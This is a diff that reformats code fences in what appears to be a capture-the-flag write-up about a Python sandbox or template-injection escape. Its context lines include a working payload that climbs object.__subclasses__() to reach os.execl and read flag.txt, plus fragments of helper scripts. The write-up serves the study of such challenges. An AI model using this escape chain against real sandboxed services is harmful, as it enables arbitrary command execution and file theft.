@@ -22,7 +22,7 @@ https://www.compart.com/en/unicode/U+FF5B
 https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection
 
 Payload:
-```python!
+```python
 print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt"))
 
 
@@ -41,8 +41,7 @@ print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spaw
 ```
 
 ## Script - run_script.py
-:::spoiler
-```python=
+```python
 import subprocess
 import time
 import multiprocessing as mp
@@ -127,10 +126,9 @@ if __name__ == "__main__":
     # p23.join()
     # p24.join()
 ```
-:::
 
 ## Script - script.py
-```python!=
+```python
 from selenium.webdriver.chrome.options import Options
 import time
 from http.client import PAYMENT_REQUIRED
@@ -222,4 +220,3 @@ print(driver.find_element(By.XPATH, '/html/body/div/div/div[2]'))
 print(args.team)
 # read_write_file('a', 123)
 ```
-
